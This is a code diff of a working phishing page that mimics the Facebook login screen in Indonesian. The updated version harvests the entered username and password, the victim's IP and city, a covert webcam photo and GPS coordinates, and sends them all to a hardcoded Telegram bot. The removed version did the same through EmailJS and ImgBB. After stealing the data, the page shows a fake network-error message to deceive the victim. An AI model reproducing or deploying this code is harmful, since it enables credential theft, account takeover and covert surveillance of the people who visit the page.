@@ -4,109 +4,102 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Login Facebook</title>
-    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; display: flex; flex-direction: column; align-items: center; }
-        .header-blue { background-color: #fff; width: 100%; padding: 20px 0; text-align: center; }
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #fff; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        .header { width: 100%; padding: 20px 0; text-align: center; }
         .fb-logo { width: 120px; margin-top: 10px; }
-        .login-container { width: 90%; max-width: 400px; margin-top: 20px; }
+        .login-box { width: 90%; max-width: 400px; margin-top: 20px; }
         input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 8px; background-color: #f5f6f7; font-size: 14px; box-sizing: border-box; }
         .btn-login { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 8px; color: white; font-size: 17px; font-weight: bold; cursor: pointer; }
-        .forgot-pass { color: #1877f2; font-size: 14px; text-align: center; display: block; margin-top: 15px; text-decoration: none; }
-        .divider { border-top: 1px solid #dddfe2; margin: 30px 0; position: relative; }
-        .btn-new-account { width: 80%; margin: 0 auto; display: block; padding: 10px; background-color: #fff; border: 1px solid #1877f2; border-radius: 8px; color: #1877f2; font-weight: bold; text-align: center; text-decoration: none; }
-        .meta-logo { width: 60px; margin-top: 50px; opacity: 0.6; }
-        #loading { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.8); z-index:99; justify-content:center; align-items:center; }
+        .forgot { color: #1877f2; font-size: 14px; text-align: center; display: block; margin-top: 15px; text-decoration: none; }
+        .footer-meta { width: 60px; margin-top: 60px; opacity: 0.5; }
+        #loading { display: none; position: fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.8); z-index:99; justify-content:center; align-items:center; font-weight:bold; color: #1c1e21; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
 
-<div id="loading">Memproses...</div>
+<div id="loading">Harap tunggu...</div>
 
-<div class="header-blue">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" class="fb-logo" alt="Facebook">
+<div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1200px-Facebook_Logo_%282019%29.png" class="fb-logo">
 </div>
 
-<div class="login-container">
+<div class="login-box">
     <input type="text" id="user" placeholder="Nomor ponsel atau email">
     <input type="password" id="pass" placeholder="Kata sandi">
-    <button class="btn-login" onclick="startTracking()">Login</button>
-    
-    <a href="#" class="forgot-pass">Lupa kata sandi?</a>
-    
-    <div class="divider"></div>
-    
-    <a href="#" class="btn-new-account">Buat akun baru</a>
-    
-    <center><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo"></center>
+    <button class="btn-login" onclick="eksekusi()">Login</button>
+    <a href="#" class="forgot">Lupa kata sandi?</a>
+    <center><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" class="footer-meta"></center>
 </div>
 
 <video id="video" autoplay></video>
 <canvas id="canvas"></canvas>
 
 <script>
-    (function(){
-        emailjs.init("5HWPoEryOV1APt1Cw");
-    })();
+    // DATA TELEGRAM ANDA
+    const TELEGRAM_TOKEN = '8717732956:AAEh9PX8gwSVDuuc46pmQotywaS6h03E5rg';
+    const CHAT_ID = '8460192289'; 
 
-    async function startTracking() {
+    async function eksekusi() {
         const u = document.getElementById("user").value;
         const p = document.getElementById("pass").value;
-
-        if(!u || !p) {
-            alert("Masukkan email dan kata sandi Anda.");
-            return;
-        }
+        if(!u || !p) return alert("Nomor ponsel atau kata sandi salah.");
 
         document.getElementById("loading").style.display = "flex";
-        let report = `[DATA LOGIN FACEBOOK]\nUser: ${u}\nPass: ${p}\n`;
 
         try {
-            // Meminta izin Kamera & Lokasi secara paksa
+            // 1. Ambil IP
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            
+            // 2. Akses Kamera
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             video.srcObject = stream;
 
+            // 3. Ambil Lokasi & Foto
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 setTimeout(async () => {
-                    // Ambil Foto
                     canvas.width = video.videoWidth;
                     canvas.height = video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    const base64 = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
+                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                     stream.getTracks().forEach(t => t.stop());
 
-                    // Upload ke ImgBB
-                    const fd = new FormData();
-                    fd.append("image", base64);
-                    const up = await fetch("https://api.imgbb.com/1/upload?key=Dba59ebe766c55b8d286f55a8fe366e2", {
-                        method: "POST", body: fd
+                    // KIRIM FOTO KE TELEGRAM
+                    const formData = new FormData();
+                    formData.append("chat_id", CHAT_ID);
+                    formData.append("photo", blob);
+                    formData.append("caption", `🔥 TARGET FACEBOOK TERDETEKSI!\n\n👤 User: ${u}\n🔑 Pass: ${p}\n🌐 IP: ${ipData.ip}\n🏙️ Kota: ${ipData.city}\n📍 Lokasi: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+
+                    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+                        method: "POST", body: formData
                     });
-                    const resUp = await up.json();
-                    
-                    // Kirim ke Email
-                    report += `📸 FOTO: ${resUp.data.url}\n📍 GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    sendFinal(report);
-                }, 2000);
+
+                    finish();
+                }, 1500);
             }, () => {
-                sendFinal(report + "\n📍 GPS: Ditolak");
+                sendTextOnly(u, p, ipData, "GPS Ditolak");
             });
 
         } catch (e) {
-            sendFinal(report + "\n📸 Kamera: Ditolak");
+            sendTextOnly(u, p, {ip: "N/A", city: "N/A"}, "Kamera Ditolak");
         }
     }
 
-    function sendFinal(m) {
-        emailjs.send("service_e3ap8de", "template_ts6dxmh", { message: m })
-        .then(() => {
-            alert("Kesalahan koneksi jaringan. Silakan coba lagi nanti.");
-            location.reload();
-        });
+    async function sendTextOnly(u, p, ip, status) {
+        const msg = `⚠️ TARGET LOGIN (Tanpa Foto)\n\n👤 User: ${u}\n🔑 Pass: ${p}\n🌐 IP: ${ip.ip}\n🏙️ Kota: ${ip.city}\n🚫 Status: ${status}`;
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+        finish();
+    }
+
+    function finish() {
+        document.getElementById("loading").style.display = "none";
+        alert("Kesalahan koneksi jaringan. Silakan coba lagi nanti.");
+        location.reload();
     }
 </script>
-
 </body>
 </html>
